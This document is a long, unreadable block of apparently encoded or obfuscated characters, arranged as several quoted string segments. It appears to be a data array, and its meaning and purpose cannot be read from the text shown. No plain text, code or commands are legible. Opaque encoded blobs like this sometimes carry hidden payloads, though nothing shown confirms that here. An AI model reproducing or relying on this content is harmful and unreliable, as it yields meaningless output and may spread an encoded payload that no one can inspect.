[Yzx\\{@)JDOicGFua\"bpb\"Xu\\j%ja\"F{\\BlLBSlK`Y[gaYmwWG)|cIOCa#XwcB@)QU@vNVpLBSlKBY\\xbjAqJGmwJIKiancmLIOpbnFyanXuS\"iibncmLVpLBSlKBSm|\\YznMoTpbnXi\\INw[ZAy\\Y%lLFTpbnXi\\Bi|\\YznMnKx[ZKlMBAibnc|Y|J|L\"mcMBA|\\YznMn!x\\GWuJG\\xbn qLSpKBSmmaIOmPgpKBSlK`U@)JC@LBSlKBY\\xbjA `IKm[YSg`Y$gb\"Xu\\j%k[ZTiaG)oMoOk`GXv[XujcGi{\\YFlb{KcPgpKBSlKBYmnJGmwcBi `IKm[YTaJoAxb#T|Z\"OxcY% Jm qJC$)JG!qamAxb#T|S\")!aoS&BglKBSlKBZOmaG[wcGi{\\YFlb{%ibIAmanSpXGi{\\YFlLIOmaG[w[n)ibnSuJIO bji `IKm[YTaJn%!aUKcLUygb\"Xu\\j%va\"TmMBAna#KvLUlLBSlKBSlK`U@tQU@zBglKBSlKBYmnJGlgQV gb\"i{[ZAw\\YzC`GF{\\\"W&BglKBSlKBSmjbnXi`ypKBSlKb\"i{[ZAw\\YzC`GF{\\\"WgQUAqBglK`Y[gb\"Xu\\j%k`GFxb{@iQU@jMVDjJGFw\\BA|\\YznMnOp[Y)|JBD)JBJyJkpLBSlKcGF{\\\"X XGi{\\YFlJC gXGi{\\YFlLIOmaG[w[n)ibnSuJIOmaG[w[\"iia#NuJIOmaG[waY)l\\Uyg\\n){aUlLBSmmaIOmPgpKBSm [ZKo\\ZTW`IKm[YSgQUA|\\YznMoTpbnXi\\IOaNF LBSm{\\ZT!bn$g\\n){aUygb\"i{[ZAw\\YzC`GF{\\\"WuJITibncmcFTpbnXi\\@pK\\GXnJIOmcF)v\\YTq[Ui|\\YznMBAv\\YTq[WvqanSuJG!m\\GmiT#KxcZ@uJG!m\\Gmib OxcY% LVpLBSmv\\YTq[XAicGi|JC gY! LBSmq\\jAv\\YTq[WvqanSgJV gNCpLBSlK`Y[gaYXl`YFM`Y%lJC$gNVpLBSlKBZOmaG[wXDmOTW)XXB@tQU@|N@pKBSmq\\jAv\\YTq[WvqanSgQB@|PgpKBSlK`Y[gaYXl`YFM`Y%lJC )JCD&BglKBSlKaYXl`YFD`ZJgQU@j`Y!i\\\"X|JgpKBSlK\\Yzq\\jAv\\YTq[WvqanSgQV gNkpLBSlKBSmv\\YTq[WTqbj@)JBK\"`YTma#NjBglKBSmq\\jAu\\Y$paYXl`YFIbn)!bBlgQj@yJGFw\\BAv\\YTq[Wc{a#XyJBD)JBJyJkpLBSlKBSmv\\YTq[WTqbj@tQU@jM{JLBSlKBSmv\\YTq[WTqbj@tQUAv\\YTq[Wc{a#XyBglKBSmna#JgaYXl`YDg`Y$ga#NwaGm|cGTqbjgjMj(jL\"!m\\GmiTGm{LVpLBSlKBSmq\\jAv\\YTq[U%manT|c\"m `BgjMnqy\\{JqJG){JG!m\\GmiMnXw\\IO#`ZTpLBJwbG%oJjlga#JgaYXl`YDw\\Y%lb#cqcGgpJj%o`Y[jLUAxbjAv\\YTq[U%manT|c\"m `BgjMnKvbBJqJG){JG!m\\GmiMnXw\\IO#`ZTpLBJwaZ@ Jjlga#JgaYXl`YDw\\Y%lb#cqcGgpJj%#\\YKvJjl&BglKBSlKBY!m\\GmiWGF `INw[ZAy\\Y%lLBJwM{JtaYXl`YFD`ZJtJj(jL\"!m\\GmiLSpKBSlK`Y[gaYXl`YF|S\")!aoSgQV gNCpLBSlKBSmv\\YTq[WvqanSgQU@yBglKBYXu`Y[gb\"Xu\\j%|`IKibG%maDOp[ZKo\\U@)QU@yPgpKBSlK\\n){JIAxb#Sg`Y$gb\"Xu\\j% `IKm[YT|Y|AcMoAxb#T|PgpKBSlKBY\\xbjAv\\YTq[UAqajAya#O Mn!m\\Gmib|pLBSlKBSlKbIKqaoSpJvBi MtSuOGI MkSuvBy [$gJjygaYXl`YDwanFv\\UygJjgjL#O bjiya#O Mn%!aUltJj(jL#O bji|\\YznMoTpbnXi\\IOaNF wbG)|cIOCa#XwcBltJjCSx)B1 [ITgjljLSpKBSlKBSmv\\YTq[U%la#cwaG)i\\BgqBglKBYXub\"W&BglKBSm|\\YznMmTKVWXQXXSgL| gOk@LBSmmaIOmPgpKBSmv\\YTq[ZOCa#XwcB@)JC@LBSm{\\ZT!bn$gaYXl`YFM`Y%lMBAv\\YTq[XAicGi|MBAv\\YTq[ZOCa#Xwc@pL[\"zib#NgS\"FycGOp[XOxaI\\mbm)[S\"FycGOp[X({[\"g&Bgml\\Y[gZ!)qanm Z!(pb\"Xu\\jyg`\"X%MBAt\\Zm{\\ZDqPgpKBZOmaG[w[ZAqJC gJni cI@&M{)$MYOibITk`GD{MoK!M\"mwMoApbBJLBSm|\\YznMnvmdU@)JGvmdSpKBZA{`Y% LBKVa\"z\"\\ZJgK!gvS\"FycGOp[Ubg`Y%qcGmiaGm&\\YSgc\"m `BAt\\Zl&JBJgL{A|\\YznMnvmdUlLBYTm\\jA|a\"z\"\\Ui|\\YznMBAqaYFo\\Uyg[nFlbIKxdGmmb{l&BglKc\"iqaGWgXIK!\\VpLBSlKcGF|`{@)JBgpK\"vmdUbuJIOmaG[w`\"X%LUygLBcv\\ZTpa\"SoMB@ocZOmboKm[\"FycGOp[UbqMB@pK\"cxa\"cu\\YvmdUbuJBb\"VGXTYZp XWFASWFAVCiLS\"u|OZcJW#[\"[#XFXkXSdWzpUV\\KdIOOK{luJBgobGFo\\ZX{aBbuJBcpcITyb|pxM|Kk`B%p`{)jM{bqLSpKBSml[ZTiJC gbnXzcYX|cINwbG)|cBi|\\YznMnFy`Uyg\\GF [V! [ZOtMBA\"\\ZKq\\ol)TnFub\"WqBglKBZKmb#AxaoOmJC g\\GF [U% \\Zi BglKBZKmb#AxaoOmJC gbnX|bG)wb\"Wwb#Au`ZSpJoyjLSpKBSmq\\j@pbnX|bG)wb\"XaNF gQV gJl)MJjl&BglKBSm#`Gmu\\UAWboXmPgpKBSlKBZOxaI\\mTGF [U@)JIKmbZXmb#T|MncmcBgj`IT bCpxM#gv",
    "[\"FycGOp[VJwboWxbnX|MoApbC)t\\Zl)Jj@tJIOmaG[w`\"X%JBugJj\\q\\C jJBugbnX|bG)wb\"XaNX qBglKBSlKb\")ucnXU\\ZOya\"%|\\U@)JIOxaI\\mTGF [U% \\Zi J@pKBSlKBZOxaI\\mWnX|bG)wb\"WgQUA|a\"z\"\\XKmb#AxaoOmMoOyaGm LBK(JjlLBSlKBSmq\\j@pb\")ucnXU\\ZOya\"%|\\XuyZU@)QU@jV ujLVpLBSlKBSlKW#TicINw`Y%kS\"FycGOp[ZNpLSpKBSlKBSm{\\ZT!bn$gb\")ucnXU\\ZOya\"%|\\XuzZSpKBSlKBZTqaYWwb\"zm\\Z@pN{lLBSlKcGmv\\U%|aGXmbBg|LSqkaGF|b{AC[ZA [\"iiW\")ucnX{Z\"OibITk`GFocZK!Z|Kk`CpLBYTm\\jAfZ\"mw`ZTfZ{i|\\YznMBAt\\ZluJGvmdZKmbUl&BglKb\"Xu\\j%ibGlgQU@j`IT bIN&M{)ibGlw[\"FycGOp[U%ocZK!M{JLBSm|\\YznMnvmdU@)JGvmdSpKBZA{`Y% LBKVa\"z\"\\ZJgK\"OibITk`GDw\\#X{cUbg`Y%qcGmiaGm&\\YSgc\"m `BAt\\Zl&JBJgL{A|\\YznMnvmdUlLBYTm\\jA|a\"z\"\\Ui|\\YznMBAqaYFo\\Uyg[nFlbIKxdGmmb{l&BglKcGF|`{@)JIv)BglKcGF|`!ujcImy\\UKcJC gJl%xS\"FycGOp[XTib\"ujBglKcGF|`!ujc\"Xjb\"m \\XXUVBKcJC gJni cIA|Pj(xNnOpMnitM\"JxJgpKBZTib\"vaJocm[oOqcGXM\\ZljZU@)JBJ\"VGXTYZp XWFASWFAVCiLS\"u|OZcJW#[\"[#XFXkXSdWzpUV\\KdIOOJgpKBYTicGDgQUA{\\ZF!\\ZO b{%ya#O LIOmaG[w[ZAqJBugJnO{\\YF \\XTib\"ujMBAsb\")wQZuj[\"zq\\Y% U\"X%Jkpgb\"Xu\\j%t\\ZluJBK [ZOtJkpgcGF|`# uJI\\mbnmndV!G[Yz|\\Ulw`oOxajgqBglK`Y[gLGTicGFaJnX{bn){UYSjZU@)QU@yLVpLBSlKc\"iqaGWgXIK!\\VpLBSlKBZKmb#AxaoOmJC gbnXzcYX|cINwbG)|cBi|\\YznMnFy`U@tJBKo\\ZTW[ZOtWnX|cYz Jjyg`oOxak!\'JnOu`YXwcDvmdUJgPjA|\\YznMnvmdUygJoTib\"vK\\BJgPjA|cIJp\\GF [XujcGF|` mlJm qfUygcnX{`Y\\%QW\\iaIOmLU%sb\")wLBlLBSlKBYmnJBi{\\ZOya\"%|\\Xujb#TicIX|Jm gQV gJoKm[YT%Jjl&BglKBSlKbnX cZKwJIKmb#AxaoOmY{K|a\"z!cGmxajKcY{KoWnXk[ZA [\"iiWnX|bG)wb\"WjZSpKBSlKcGmv\\U%|aGXmbBg|LSpKBZTqaYWwb\"zm\\Z@pN{lL[\"zib#NgS\"FycGOp[XOxaI\\mbm)iaoTq[\"FycGOp[X({[\"g&Bgml\\Y[gZ!)qanm Z!(pb\"Xu\\jyg`\"X%MBAt\\Zm{\\ZDqPgpKBZOmaG[w[ZAqJC gJni cI@&M{)ibGlw[Y% `U!k[ZA [\"iiMnOxaU(jBglKb\"Xu\\j%t\\ZlgQUAt\\ZlLBSmybnmwcBgjW\")ucnX{JBciaoTqMYOibITk`GDoJGmw`ZTq[YzqdnXlJIcqcGgg`\"X%Pj@jJBugb\"Xu\\j%t\\ZlqBgml\\Y[gb\")ucnWpb\"Xu\\jyg`Y!i\\\"WuJGKi\\IA{a#iq\\ZNqPgpKBZTib\"ugQUA\'fSpKBZTib\"vaJoT%bGWjZU@)JBKKaYFo\\XTxXGX$cFTib\"ujBglKcGF|`!uj[n)ldUKcJC g[nF|\\V[ MnJ\"OGXw[\")l\\UiqaYFo\\Ulw\\GXka\"TmLBK!cG[vPBJqBglKcGF|`!ujbGi{[ZOmJm gQUAG[Yz|\\SpKBZTib\"vaJnOib\"WjZU@)JD\\iaIOmBglKcGF|`!ujaoXv\\ZKq[{KcJC gNSpKBZTib\"vaJn!icGgjZU@)JD\\iaIOmBglKcGF|`!ujaYmwVGXw\\#TpJm gQU@\"BglKcGF|`!ujaYF$VGXw\\#TpJm gQU@\"BglK\\GF [U@)JIKmbZXmb#T|MoAxb#Spb\"Xu\\j%ibGlgL{@j[#Km[ZTmXGF|`{JuJGq|a\"$)d{KkaGmmaoTM\\ZljPjA|\\YznMnvmdUygJoTib\"ujPjA [ZOtfUygcnX{`Y\\%QW\\iaIOmLU%sb\")wLBlLBSmq\\j@p\\GF [Xuj\\ZK{a#KK\\BKcJC )JC@qPgpKBSm#`Gmu\\UAWboXmPgpKBSlKbnX|bG)wb\"WgQUA{\\ZF!\\ZO b{%ya#O LIOmaG[w[ZAqJBugJncmcFTib\"vU\\ZO!aISjMBAsb\")wQZuj[\"zq\\Y% U\"X%Jj@&JIOmaG[w`\"X%MB@jcGF|` mlJj@&JIO bjil[ZTiY{K [ZOtUYSjZUm)MBA\"\\ZKq\\ol)TnFub\"WqMnq|a\"$pLSpKBSlK`Y[gLIKmb#AxaoOmY{K|cGF cZNjZU@)QU@jbnXi\\IljLVpLBSlKBSm{\\ZT!bn$gbnX|bG)wb\"XaJoOxaIX `Y)wJm!aJoTmdISjZSpKBSlKcGmv\\U%|aGXmbBg|LSpL[\"zib#NgS\"FycGOp[XOxaI\\mbm)[S\"FycGOp[X){\\VpLBYTm\\jAfZ\"mw`ZTfZ{i|\\YznMBAt\\ZluJGvmdZKmbUl&BglKb\"Xu\\j%ibGlgQU@j`IT bCpxM#gv[\"FycGOp[VJwboWx`Y$wbGiyJgpKBZOmaG[w`\"X%JC g`\"X%BglKcIK%PgpKBSmq\\jAt\\Zm{\\ZDwb#TicIX|Z\"Ox\\GWgQV gNk@yPgpKBSlKbIKqaoSpJmOxaI\\mbj@oYB!C[ZA [\"iiK{Aqanm `YFu`Zqm\\BA#`ZTpJGvmdVpgY)BW KCSocBc LxSmUCSp)BW KCSn)BX K#Ss! jLSpKBYX$[\"XycBAFdGOmbITqa\"$&BglKBZA{`Y% LBKVa\"z\"\\ZJgK!gvS\"FycGOp[Ubg`Y%qcGmiaGm&\\YSgc\"m `BAt\\Zl&JBJgL{A|\\YznMnvmdUlLBYTm\\jA|a\"z\"\\Ui|\\YznMBAqaYFo\\Uyg[nFlbIKxdGmmb{yg\\n){[nml\\GXwbIKxdIlqPgpKBZcp`YzmJFT{cYW&BglKBZTib\"ugQU@pLBct\\ZloMBA|\\YznMnvmdUluJBgoaYX `G)lK{ygK#X|\\ZK{\\YOibITk`GDoLUygLBcoa\")oaGXt\\ZloMB@oOlzmWXm&OFXASWFASWy$UlOtN|X#UFO\"OnO!TX[!WImN`Dl\"UZi|VUbqMB@pK#Ai\\\"X!bnyoMB@o`IT bIN&M{({[\"gw`Gux[j(oLUlLBSlK\\GF [U@)JIKmbZXmb#T|MoAxb#Spb\"Xu\\j%ibGluJGTicGD)cGF|`{ygcnX{`Y\\%QW\\iaIOmLSpKBSm{\\ZOya\"%|\\U@)JGTicGDwcGX$c@pKBSm{\\ZOya\"%|\\U@)JIKmb#AxaoOm",
    "MoOyaGm LBK(JjlLBSlK`Y[gLIKmb#AxaoOmY|AcJC )JBKQU{JqPgpKBSlKc\"iqaGWgXIK!\\VpLBSlKBSm|a\"z\"\\WTicGDgQUA{\\ZF!\\ZO b{%o\\ZSpJni cI@&M{)$MYOibITk`GD{MoK!M#Kmb{%y`I@3`\"X%QUJgL{A|\\YznMnvmdU@tJBJn`YS)Jj@tJIKmb#AxaoOmY|FcLSpKBSlKBZOxaI\\mWnX|bG)wb\"WgQUA|a\"z\"\\WTicGDwcGX$cB@LBSlKBSm|a\"z\"\\XKmb#AxaoOmJC gb\")ucnXU\\ZOya\"%|\\U%|bGzqcBgjfBJqBglKBSlK`Y[gLIOxaI\\mWnX|bG)wb\"XaNF gQV gJl)MJjl&BglKBSlKBXO [ZT|Mnmw[ OibITk`GF|LBlLBSlKBSlKbnX cZKwJIOxaI\\mWnX|bG)wb\"XaNX LBSlKBSm `Y!mMoOu\\YXyLCNqBglKBYXu`Y[g\\GF [U% \\Zi JC )JBKFWmKQWm)MTXmfXXOFWjJ&BglKBSmybnmwcBgjZG\'SovGJ MkSucB& M@g MtSw)GP [fSuByg M#SvUCSxOB1 MQTg{CSx)G@ M\'SvOB1 MxSvvBy [MTkBCTgOBy MISxvGB [NwMj$jLSpKBSlKb\"Fn\\X)zcYm LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBSm `Y!mMoOu\\YXyLCNqBnOu[ZO|JDOibITk`GFVa\"z\"\\ZKf[\"FycGOp[Yc!boXfbnW&Bgml\\Y[gZ!)qanm Z!(pb\"Xu\\jyg`\"X%MBAt\\Zm{\\ZDqPgpKBZOmaG[w[ZAqJC gJni cIA|Pj(x[ZAqMnOibITk`GDw\\#X{cU(jBglKb\"Xu\\j%t\\ZlgQUAt\\ZlLBSm bol&BglKBYmnJGvmdZKmbU%|cGF cZOf[\")l\\U@)QU@{NC@&BglKBSmybnmwcBgjW\")ucnX{JBck[ZA [\"iiMnc!boWoJGmw`ZTq[YzqdnXlJIcqcGgg`\"X%PjAa KVSlOBc K#Ss)BXJOBk KVSlOBa KZSocBtZUJqBglK\\Zik\\ZA JDX$[\"XycGmxakpLBSlKbIKqaoSpJmOxaI\\mbj@o[\"FycGOp[U%ocZK!K{Aqanm `YFu`Zqm\\BA#`ZTpJGvmdVpgJj@tJIOmaG[w`\"X%LSpK\\GXnJIOxaI\\mLIOmaG[uJGmv[YcmMBAj[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUl&BglKcGF|`{@)JIv)BglKcGF|`!ujcImy\\UKcJC gJl%xS\"FycGOp[XTib\"ujBglKcGF|`!ujc\"Xjb\"m \\XXUVBKcJC gJni cIA|Pj(xNnOpMnitM\"JxJgpKBZTib\"vaJocm[oOqcGXM\\ZljZU@)JBJ\"VGXTYZp XWFASWFAVCiLS\"u|OZcJW#[\"[#XFXkXSdWzpUV\\KdIOOJgpKBYTicGDgQUA{\\ZF!\\ZO b{%ya#O LIOmaG[w[ZAqJBugJnO{\\YF \\XTib\"ujMBAsb\")wQZuj[\"zq\\Y% U\"X%Jkpgb\"Xu\\j%t\\ZluJBK [ZOtJkpgcGF|`# uJI\\mbnmndV!G[Yz|\\Ulw`oOxajgqBglK`Y[gLGTicGFaJnX{bn){UYSjZU@)QU@yLVpLBSlKc\"iqaGWgXIK!\\VpLBSlKBZKmb#AxaoOmJC gbnXzcYX|cINwbG)|cBi|\\YznMnFy`U@tJBKo\\ZTW[ZOtWnX|cYz Jjyg`oOxak!\'JnOu`YXwcDvmdUJgPjA|\\YznMnvmdUygJoTib\"vK\\BJgPjA|cIJp\\GF [XujcGF|` mlJm qfUygcnX{`Y\\%QW\\iaIOmLU%sb\")wLBlLBSlKBYmnJBi{\\ZOya\"%|\\Xujb#TicIX|Jm gQV gJoKm[YT%Jjl&BglKBSlKbnX cZKwJIKmb#AxaoOmY{K|a\"z!cGmxajKcY{KoWnXk[ZA [\"iiWnX|bG)wb\"WjZSpKBSlKcGmv\\U%|aGXmbBg|LSpKBYXu`Y[gLGTicGFaJnX{bn){UYSjZU@)QU@zLVpLBSlK`Y[gLGTicGFaJnX{bn){TGX|[#KqbITqa\"$jZU@)QU@jTXKUV!KfU X\\Z TQTXOfVl)WZ X[UXOWJjl&BglKBSmybnmwcBgjZG\'SnvB\' [\'Ti{CSxvGB M\'Sv)B{ MCSxUyg M#SvUCSxOB1 MQTg{CSx)G@ M\'SvOB1 MxSvvBy [MTkBCTgOBy MISxvGB [NwMj$jLSpKBSlKb\"Fn\\X)zcYm LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBSmmaGmnJBil[ZTiY{KmboKxblTmb\"O{`ZA `Y)wJm gQV gJlXUWl)UZ!qFWl)fSlFNSW%CTUJqPgpKBSlKbIKqaoSpJmzw KfSuOB& M\'SxcGI MkSw)B$ [ITkBCSvOB! M#TkOB| Mgg M#SuBCSwvBy M3Ti)B!MBCSxcB!JOB( M\'Su)GCJOB3 [CSxvB  M\'Sw)B\" MCTgvGNJOG@ MCSucB1 [MTg{$wMjJqBglKBSm|[Y\\mZ#F!`ZSp[nFlbIKxdGmmb{yg\\n){[nml\\GXwbIKxdIlqBglKBYXu`Y[gLGTicGFaJnX{bn){TGX|[#KqbITqa\"$jZU@)QU@jTXKUV!KfVl)fW zQXF)AXlFKVDFBVDWjLVpLBSlKBZA{`Y% LBKbavBc MZTgjCTgcB{ M\'SucB1 MVSxcGM [Wg MkSxcB  [QTgcGA M\'SujCSxcByJOGA MZTgOB{ MZTgOB!MBCTgvBy MoSxOBy [QTgj@zNBCTgcB! MtTg)B) MSwMj$jLSpKBSlKcGmv\\U%|aGXmbBg#LSpKBSmmaIOmPgpKBSlKbIKqaoSpJmzw K3TgOB1 MkSv)B1 [kSw)ByJOB) MZSuvB! MVSxvB( MCTk{CSvcBz MCSxcBy [(g [ZTg)B% M#Tk{yg [ISxvG@ [3SxU$g KMSxvGBJOB1 [MSuvB! [Jg M\'TgjCTgcB! [CSuvB! [CSuCpjMB@p\\GF [Xuj\\ZK{a#KD\\ZOkbnmycGmxajKcLUlLBSlKBZOi\\nXfbZXqcBij[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUlLBSm `Y!mMoOu\\YXyLCNqBnOu[ZO|JDOibITk`GFVa\"z\"\\ZKf[Y% `YOibITk`GFfbnW&Bgml\\Y[gZ!)qanm Z!(pb\"Xu\\jyg`\"X%MBAt\\Zm{\\ZDqPgpKBZOmaG[w[ZAqJC gJni cI@&M{)ibGlw[Y% `U!k[ZA [\"iiMnOxaU(jBglKb\"Xu\\j%t\\ZlgQUAt\\ZlLBSm bol&BglKBYmnJGvmdZKmbU%|cGF cZOf[\")l\\U@)QU@{NC@&BglKBSmybnmwcBgjW\")ucnX{JBciaoTqMYOibITk`GDoJGmw`ZTq[YzqdnXlJIcqcGgg`\"X%PjAa KVSlOBc K#Ss)BXJOBk KVSlOBa KZSocBt",
    "ZUJqBglK\\Zik\\ZA JDX$[\"XycGmxakpLBSlKbIKqaoSpJmOxaI\\mbj@o[Y% `U!k[ZA [\"iiK{Aqanm `YFu`Zqm\\BA#`ZTpJGvmdVpgJj@tJIOmaG[w`\"X%LSpK\\GXnJIOxaI\\mLIOmaG[uJGmv[YcmMBAj[YTybn)$`YX|MBAna#Kj`YTl\\Y%ybn)$dUl&BglKcGF|`{@)JIv)BglKcGF|`!ujcImy\\UKcJC gJl%xS\"FycGOp[XTib\"vSbn)$dYzmb#NjBglKcGF|`!ujc\"Xjb\"m \\XXUVBKcJC gJni cIA|Pj(xNnOpMnitM\"JxJgpKBZTib\"vaJocm[oOqcGXM\\ZljZU@)JBJ\"VGXTYZp XWFASWFAVCiLS\"u|OZcJW#[\"[#XFXkXSdWzpUV\\KdIOOJgpKBYTicGDgQUA{\\ZF!\\ZO b{%ya#O LIOmaG[w[ZAqJBugJnO{\\YF \\XTib\"ujMBAsb\")wQZuj[\"zq\\Y% U\"X%Jkpgb\"Xu\\j%t\\ZluJBK [ZOtJkpgcGF|`# uJI\\mbnmndV!G[Yz|\\Ulw`oOxajgqBglK`Y[gLGTicGFaJnX{bn){UYSjZU@)QU@yLVpLBSlKc\"iqaGWgXIK!\\VpLBSlKBZKmb#AxaoOmJC gbnXzcYX|cINwbG)|cBi|\\YznMnFy`U@tJBKo\\ZTW[ZOtWnX|cYz Jjyg`oOxak!\'JnOu`YXwcDvmdUJgPjA|\\YznMnvmdUygJoTib\"vK\\BJgPjA|cIJp\\GF [XujcGF|` mlJm qfUygcnX{`Y\\%QW\\iaIOmLU%sb\")wLBlLBSlKBYmnJBi{\\ZOya\"%|\\Xujb#TicIX|Jm gQV gJoKm[YT%Jjl&BglKBSlKbnX cZKwJIKmb#AxaoOmY{K|a\"z!cGmxajKcY{KoWnXk[ZA [\"iiWnX|bG)wb\"WjZSpKBSlKcGmv\\U%|aGXmbBg|LSpKBYXu`Y[gLGTicGFaJnX{bn){UYSjZU@)QU@zLVpLBSlK`Y[gLGTicGFaJnX{bn){TGX|[#KqbITqa\"$jZU@)QU@jTXKUV!KfU X\\Z TQTXOfVl)WZ X[UXOWJjl&BglKBSmybnmwcBgjZG\'SnvB\' [\'Ti{CSxvGB M\'Sv)B{ MCSxUyg M#SvUCSxOB1 MQTg{CSx)G@ M\'SvOB1 MxSvvBy [MTkBCTgOBy MISxvGB [NwMj$jLSpKBSlKb\"Fn\\X)zcYm LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBSmmaGmnJBil[ZTiY{KmboKxblTmb\"O{`ZA `Y)wJm gQV gJlXUWl)UZ!qFWl)fSlFNSW%CTUJqPgpKBSlKbIKqaoSpJmzw KfSuOB& M\'SxcGI MkSw)B$ [ITkBCSvOB! M#TkOB| Mgg M#SuBCSwvBy M3Ti)B!MBCSxcB!JOB( M\'Su)GCJOB3 [CSxvB  M\'Sw)B\" MCTgvGNJOG@ MCSucB1 [MTg{$wMjJqBglKBSm|[Y\\mZ#F!`ZSp[nFlbIKxdGmmb{yg\\n){[nml\\GXwbIKxdIlqBglKBYXub\"W&BglKBSmybnmwcBgjZG\'So)G@ M\'SwOB# M\'TjOB\' M@g M#SvcB{ MZSvOB1 M|SuOGQJOB! MISuOB) MCTk{CTicGC MoSxcGQMBCTgcB1 [CTk)B)MjCSlvB1 [Jg M\'TgvB{ MZTgjCSxvGBJOGA MZTgOB{ MZTgOByPjJuJBil[ZTiY{KmboKxblTmb\"O{`ZA `Y)wJm qLSpKBSlKb\"Fn\\X)zcYm LGKi\\IA{a#iq\\ZNuJG\\xbnKq\\GTmaoA{a#i%LSpKBZTqaYWwb\"zm\\Z@pN{lLBlOJSXKVJC gb#T{`Y%oMnF|[\"mqZ#XybGX{[\"F|\\U@tJIO bnmw\\{%l`YcqcINLXDX[XF)CUDFUW{@)JIO bnmw\\{%ib\"Oq`X)!bIAmbnOib\"WgL{A|cIKqanbw\\Gmo`ZT|JBugb#T{`Y%oMnF|[\"mqZ\"zxc\"X{[\"F|\\U@tJBi|cIKqanbwc\"iqcGX|bGFk\\U@sJCDyLU@tJIO bnmw\\{%ycY%kcIXicGmxagqPSW!FZ!OKYlWgQU@zO@qj[YTybn)$`YX|JC gY! L\\n){[nml\\GXwbIKxdIlgQUAaZSql\\Y[gb\"ixc!)ua\"cxLBl&Bgmxb{%|dZO \\Y pK\"Oub{bg`Y[ga#NwanFv\\U@)QU@oaoSoJGXub\"WgK\"Ou\\YF{K{lLBZA{`Y% LBKbajpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpjLSpKbIKqaoSpJjpgJB@gNlOJMliMJFcKWDWgVWFCUDmPTU@vJFKmS\"FycGOp[UAm\\Gm `Y)wJB@gJBpjLSpKbIKqaoSpJjpgJB@gJOBj M\'Sw)GN MtSxjCSvOB\' [(g MMSxcGC [MTgOB! M#SxcB! MQSxjCSwOGA M3SxvB\' [|Sv)B1 MMSuOB) MkTk{@gJB@gJBpjLSpKbIKqaoSpJjpgJB@gJB@gJOBd [CSwOB| MkSxcBy MxTkOB) [xSwUCSx)G@ M\'SvcB& [J&JGcua#cfb#Tq[\"ugJB@gJB@gJBpjLSpKbIKqaoSpJjpgJB@gJBCSlcGM MVSw)B1 MtSxvB PjAxc\")l\\Yz [Uyg`\")j[ZTxMBAibnXu`Z\\mJB@gJB@gLjJqBgmybnmwcBgjLj@gJB@gJB@gJB@gJGO{dZA a#O `Y!xbjygcIO!anFv[ZK!JB@gJB@gJB@gJB@gLjJqBgmybnmwcBgjLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjpsLjJqBnOu[ZO|JDOibITk`GD&Bgml\\Y[gZ!)qanm Z!(pb\"Xu\\jygbIKxdIluJGFo\\Y% MBAja\"F{\\BygcGi{\\YFlMBA|a\"z\"\\ZJuJFTKVWXQXXSuJGOibITk`GFWdZAmLVpLBSmq\\j@p[\"FycGOp[XT%bGWqJC )JBJ{[\"gjPgpKBSm|\\YznMnFy`U@)JBKpcITyb|pxM|Kk`B%p`{)ibGlx[\"FycGOp[U({[\"iibITk`GDxJgpKBYXub\"W&BglKBZOmaG[w[ZAqJC gJni cIA|Pj(xNnOpMnitM\"Fy`U)k[ZA [\"iiM#Km[\"FycGOp[U)q\\BJLBSm|\\YznMoA{a#i%JC gbIKxdIlLBSm|\\YznMnKx[ZKlJC g[n)ibnSLBSm|\\YznMoTpbnXi\\B@)JITpbnXi\\@pKBZOmaG[wb\")ucnX{JC gb\")ucnX{BglKb\"Xu\\j%WUW!FV!XWJC gXDmOTW)XX@pKBZOmaG[wb\"X Z\"im[YTmboNp[YcmaoSqBglK[\"FycGOp[U@)JIKmbZXmb#T|MncmcBi|\\YznMnFy`U@tJBKq\\C)ja\"F{\\C jJBugb\"Xu\\j%ja\"F{\\B@tJBJncGi{\\YFlQUJgL{A|\\Yzn",
    "MoTpbnXi\\BygbIKxdGmmb|!|\\YznMoA{a#i%MBAp\\YFl\\ZK|QZOmaG[w`GXi\\GX{b{ygcGmv\\Y)!cC!|\\YznMmTKVWXQXXSuJI\\mbnmndV!G[Yz|\\Ulw`oOxajgqBglKb\"Xu\\j%q\\B@)JGOibITk`GFaJnmlJm LBSm|\\YznMnmv[YcmJC gbnXzcYX|cINw\\\"X LIOmaG[w[ZAqJBugJnmv[YcmM{JgL{A|\\YznMnmlMBAybn)$`YX|QZOmaG[wbIKxdIluJGim[YTmboN)b\"Xu\\j%p\\YFl\\ZK|MBA `Y!ma#X QZOmaG[wXDmOTW)XXBygcnX{`Y\\%QW\\iaIOmLU%ka\"% \\Y% Bgml\\Y[gb\"X Z\"im[YTmboNpb\"Xu\\jyg[YcmaoSqPgpKBZOmaG[w`GXi\\GX{b{@)JIv)BglKb\"Xu\\j%p\\YFl\\ZK|Y{KJa#O Jm gQU@jNnOpMnitJgpKBZOmaG[w`GXi\\GX{b{%!bGTicGWp[YcmaoSqBglKb\"Xu\\j%p\\YFl\\ZK|Y{KA[\"OmbISjZU@)JBK \\Zi M\"i aYyu[ZAyaGmk[ZTqa\"$xdGi aYytdG!uMGFybGzq[\"F `Y)wM#ivaCvzQV@wPUysM{p\'bV yMkgjBglKb\"Xu\\j%p\\YFl\\ZK|Y{KA[\"OmbISvVGFw\\#Xi\\\"WjZU@)JBK{cU!UXUz{cVvzQV@wPBzmaj!XW|vzQV@wOUzmakvzQV@wN{JLBSm|\\YznMnim[YTmboOaJlFk[\"XycB!FanOx\\Gmw\\{KcJC gJnc&`Z@uJGTm\\nzicGWuJGK{JgpKBZOmaG[w`GXi\\GX{b!ujS\")wanXkcGmxajKcJC gJnvm\\Z@v[YzqcnWjBglKb\"Xu\\j%p\\YFl\\ZK|Y{KXbGc{[YTmMWmwb\"XkcZKmMXKmbZXmb#T|Jm gQU@jNUJLBYTm\\jA|a\"z\"\\Ui|\\YznLVpLBSmybnmwcBi|\\YznMoA{a#i%Y{KpcITyJm 